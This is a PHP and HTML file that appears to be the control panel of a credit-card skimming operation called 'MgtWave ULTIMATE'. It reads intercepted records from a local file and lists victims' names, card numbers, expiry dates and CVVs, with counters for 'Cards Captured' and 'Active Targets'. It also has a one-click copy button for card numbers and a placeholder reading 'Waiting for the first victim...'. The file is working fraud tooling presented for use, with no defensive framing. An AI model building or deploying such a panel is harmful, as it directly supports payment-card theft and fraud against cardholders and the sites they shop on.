<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSHACK - MgtWave ULTIMATE PANEL</title>
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-deep: #020617;
            --bg-card: rgba(15, 23, 42, 0.8);
            --accent-blue: #38bdf8;
            --accent-green: #4ade80;
            --accent-red: #fb7185;
            --text-main: #f1f5f9;
            --text-dim: #94a3b8;
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        * {
            box-sizing: border-box;
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
        }

        body {
            font-family: 'Space Grotesk', sans-serif;
            background: var(--bg-deep);
            color: var(--text-main);
            margin: 0;
            min-height: 100vh;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(56, 189, 248, 0.05) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(74, 222, 128, 0.05) 0%, transparent 40%);
        }

        /* Premium Scrollbar */
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: var(--bg-deep); }
        ::-webkit-scrollbar-thumb { background: #1e293b; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #334155; }

        .dashboard {
            max-width: 1400px;
            margin: 0 auto;
            padding: 40px 20px;
        }

        /* Header Section */
        .sidebar-brand {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 40px;
        }

        .brand-logo {
            width: 45px;
            height: 45px;
            background: linear-gradient(135deg, var(--accent-blue), #818cf8);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 20px rgba(56, 189, 248, 0.3);
        }

        .brand-name {
            font-size: 24px;
            font-weight: 700;
            letter-spacing: -0.5px;
            background: linear-gradient(to right, #fff, #94a3b8);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        /* Stats Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 24px;
            margin-bottom: 40px;
        }

        .stat-card {
            background: var(--bg-card);
            backdrop-filter: blur(12px);
            border: 1px solid var(--glass-border);
            border-radius: 20px;
            padding: 24px;
            position: relative;
            overflow: hidden;
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; width: 4px; height: 100%;
            background: var(--accent-blue);
        }

        .stat-card.success::before { background: var(--accent-green); }

        .stat-label {
            font-size: 14px;
            color: var(--text-dim);
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .stat-value {
            font-size: 32px;
            font-weight: 700;
            margin-top: 12px;
            color: #fff;
        }

        /* Table Section */
        .content-card {
            background: var(--bg-card);
            backdrop-filter: blur(12px);
            border: 1px solid var(--glass-border);
            border-radius: 24px;
            overflow: hidden;
        }

        .card-header {
            padding: 24px;
            border-bottom: 1px solid var(--glass-border);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .card-title {
            font-size: 18px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .table-responsive {
            overflow-x: auto;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th {
            text-align: left;
            padding: 16px 24px;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: var(--text-dim);
            background: rgba(255, 255, 255, 0.02);
        }

        td {
            padding: 18px 24px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
            font-size: 14px;
        }

        tr:hover td {
            background: rgba(56, 189, 248, 0.02);
        }

        .cc-box {
            background: #1e293b;
            padding: 6px 12px;
            border-radius: 8px;
            font-family: 'JetBrains Mono', monospace;
            color: var(--accent-blue);
            cursor: pointer;
            border: 1px solid transparent;
        }

        .cc-box:hover {
            border-color: var(--accent-blue);
            background: rgba(56, 189, 248, 0.1);
        }

        .badge {
            padding: 4px 8px;
            border-radius: 6px;
            font-size: 11px;
            font-weight: 600;
            background: rgba(74, 222, 128, 0.1);
            color: var(--accent-green);
        }

        .status-online {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: var(--accent-green);
            border-radius: 50%;
            margin-right: 6px;
            box-shadow: 0 0 10px var(--accent-green);
        }

        .empty-state {
            padding: 60px;
            text-align: center;
            color: var(--text-dim);
        }

        .empty-state i { font-size: 48px; margin-bottom: 20px; opacity: 0.3; }

        @media (max-width: 768px) {
            .stats-grid { grid-template-columns: 1fr; }
            .dashboard { padding: 20px 15px; }
        }
    </style>
</head>
<body>

<div class="dashboard">
    <div class="sidebar-brand">
        <div class="brand-logo">
            <i class="fas fa-shield-halved text-white"></i>
        </div>
        <div class="brand-name">MgtWave ULTIMATE v4.2</div>
    </div>

    <!-- Stats Row -->
    <div class="stats-grid">
        <div class="stat-card">
            <div class="stat-label"><i class="fas fa-credit-card"></i> Total Cards Captured</div>
            <div class="stat-value">
                <?php 
                    $hits = file_exists("hits_db.txt") ? file("hits_db.txt") : [];
                    echo count($hits); 
                ?>
            </div>
        </div>
        <div class="stat-card success">
            <div class="stat-label"><i class="fas fa-bolt"></i> System Status</div>
            <div class="stat-value"><span class="status-online"></span> ACTIVE</div>
        </div>
        <div class="stat-card">
            <div class="stat-label"><i class="fas fa-globe"></i> Active Targets</div>
            <div class="stat-value">1 Site</div>
        </div>
    </div>

    <!-- Latest Hits -->
    <div class="content-card">
        <div class="card-header">
            <div class="card-title">
                <i class="fas fa-list-ul" style="color: var(--accent-blue);"></i>
                Live Intercepted Data
            </div>
            <div style="font-size: 12px; color: var(--text-dim);">
                Auto-refreshing every 30s
            </div>
        </div>
        <div class="table-responsive">
            <table>
                <thead>
                    <tr>
                        <th>Timestamp</th>
                        <th>Target Site</th>
                        <th>Cardholder</th>
                        <th>Card Number</th>
                        <th>Exp / CVV</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    if (count($hits) > 0) {
                        $reversed_hits = array_reverse($hits);
                        foreach ($reversed_hits as $hit) {
                            $data = json_decode($hit, true);
                            if ($data) {
                                $site = parse_url($data['page_url'], PHP_URL_HOST);
                                $time = date("M d, H:i", strtotime($data['timestamp']));
                                echo "<tr>";
                                echo "<td style='color: var(--text-dim)'>$time</td>";
                                echo "<td><span class='badge'>$site</span></td>";
                                echo "<td><b>" . htmlspecialchars($data['cc_name']) . "</b></td>";
                                echo "<td><span class='cc-box' onclick='copyToClipboard(\"{$data['cc_number']}\")'>{$data['cc_number']}</span></td>";
                                echo "<td><span class='badge' style='background:rgba(56,189,248,0.1); color:var(--accent-blue)'>{$data['cc_exp']} • {$data['cc_cvv']}</span></td>";
                                echo "<td><i class='fas fa-trash' style='color:var(--accent-red); cursor:pointer;'></i></td>";
                                echo "</tr>";
                            }
                        }
                    } else {
                        echo "<tr><td colspan='6' class='empty-state'>
                            <i class='fas fa-box-open'></i><br>
                            Waiting for the first victim...
                        </td></tr>";
                    }
                    ?>
                </tbody>
            </table>
        </div>
    </div>
</div>

<script>
    function copyToClipboard(text) {
        navigator.clipboard.writeText(text).then(() => {
            alert('Card number copied to clipboard!');
        });
    }

    // Auto Refresh logic could be added here
    // setTimeout(() => location.reload(), 30000);
</script>

</body>
</html>
